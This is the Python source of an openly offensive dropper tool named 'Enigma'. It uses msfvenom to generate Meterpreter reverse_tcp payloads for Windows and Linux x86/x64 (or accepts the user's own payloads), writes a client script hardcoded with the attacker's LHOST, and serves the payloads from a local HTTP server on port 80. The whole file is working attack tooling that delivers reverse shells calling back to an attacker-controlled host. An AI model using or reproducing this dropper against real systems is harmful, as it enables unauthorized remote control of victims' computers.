#-*- coding: utf-8 -*-
#------------------------------------------------------
#
#      BY: UNDEADSEC from BRAZIL :)
#      Visit: https://www.youtube.com/c/UndeadSec
#      Github: https://github.com/UndeadSec/EvilURL
#------------------------------------------------------
from subprocess import call
from time import sleep
from os import geteuid
from sys import exit

if not geteuid() == 0:
    exit('Enigma must be run as root')
RED, WHITE, YELLOW, CIANO, GREEN, END = '\033[91m', '\33[46m', '\33[93m', '\33[36m', '\033[1;32m', '\033[0m'
def message():
    call('clear', shell=True)
    print '''
{1}:::::::::: ::::    ::: ::::::::::: ::::::::  ::::    ::::      :::     
:+:        :+:+:   :+:     :+:    :+:    :+: +:+:+: :+:+:+   :+: :+:   
+:+        :+:+:+  +:+     +:+    +:+        +:+ +:+:+ +:+  +:+   +:+  
+#++:++#   +#+ +:+ +#+     +#+    :#:        +#+  +:+  +#+ +#++:++#++: {0}
+#+        +#+  +#+#+#     +#+    +#+   +#+# +#+       +#+ +#+     +#+ 
#+#        #+#   #+#+#     #+#    #+#    #+# #+#       #+# #+#     #+# 
########## ###    #### ########### ########  ###       ### ###     ### 
						                   {1}DROPPER
                     by: UNDEADSEC from BRazil'''.format(CIANO, END)
def runServer():
    print '\n {0}[{1}*{0}]{1} Starting Server... {2}H4ppy h4ck1ng {1}:)'.format(CIANO, END, GREEN)
    sleep(3)
    call('cd Server && python -m SimpleHTTPServer 80', shell=True)

def generatePayloads():
    call('rm -Rf Server/x64/* && rm -Rf Server/x86/*', shell=True)
    payloadLHOST= raw_input('\n {0}[{1}~{0}]{1} Insert your payload LHOST: '.format(CIANO, END))
    payloadLPORT= raw_input('\n {0}[{1}~{0}]{1} Insert your payload LPORT: '.format(CIANO, END))
    print '\n {0}[{1}~{0}]{1} Generating Payloads...'.format(CIANO, END)
    call('msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=' + payloadLHOST + ' LPORT=' + payloadLPORT + ' -f elf -o Server/x64/lin.elf', shell=True)
    call('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=' + payloadLHOST + ' LPORT=' + payloadLPORT + ' -f elf -o Server/x86/lin.elf', shell=True)
    call('msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=' + payloadLHOST + ' LPORT=' + payloadLPORT + ' -f exe -o Server/x64/win.exe', shell=True)
    call('msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + payloadLHOST + ' LPORT=' + payloadLPORT + ' -f exe -o Server/x86/win.exe', shell=True)

def generateClient():
    lhost= raw_input('\n {0}[{1}~{0}]{1} Insert your LHOST: '.format(CIANO, END))
    template = open('Clients/sister.py', 'r')
    template = template.read()
    new = open('Output/sister.py', 'w')
    new.write('#!/usr/bin/python\n# -*- coding: utf-8 -*-\nhost = \'' + lhost + '\'\n')
    new.write(template)
    print '\n {0}[{1}~{0}]{1} Generating Clients...'.format(CIANO, END)
    sleep(3)
    print '\n {0}[{1}*{0}]{1} Process done.\n\n {2}[{1}*{2}] Clients saved to Output/{1}'.format(CIANO, END, GREEN)

def init():
    call('rm -Rf Server/x64/* && rm -Rf Server/x86/*', shell=True)
    print '\n {0}[{1}~{0}]{1} Arranging the house...'.format(CIANO, END)
    sleep(3)
    call('cp ' + win64 + ' Server/x64/win.exe', shell=True)
    call('cp ' + win86 + ' Server/x86/win.exe', shell=True)
    call('cp ' + lin64 + ' Server/x64/lin.elf', shell=True)
    call('cp ' + lin86 + ' Server/x86/lin.elf', shell=True)
    print '\n {0}[{1}*{0}]{1} Process done.'.format(CIANO, END)

def main():
    global win64, win86, lin64, lin86, mac64, mac86
    print ' Select an option:\n\n {0}[{1}1{0}]{1} Insert your custom payloads  -> Recommended\n\n {0}[{1}2{0}]{1} Generate payloads with metasploit'.format(CIANO, END)
    ask = raw_input('\n{0} EN1GM4 {1}> '.format(CIANO, END))
    if ask == '1':
        win64 = raw_input('\n {0}[{1}1{0}/{1}4{0}]{1} Insert Windows Payload x64 file path: '.format(CIANO, END))
        win86 = raw_input('\n {0}[{1}2{0}/{1}4{0}]{1} Insert Windows Payload x86 file path: '.format(CIANO, END))
        lin64 = raw_input('\n {0}[{1}3{0}/{1}4{0}]{1} Insert Linux Payload x64 file path: '.format(CIANO, END))
        lin86 = raw_input('\n {0}[{1}4{0}/{1}4{0}]{1} Insert Linux Payload x86 file path: '.format(CIANO, END))
        init()
    if ask == '2':
        generatePayloads()
    generateClient()
    runServer()

message()
main()
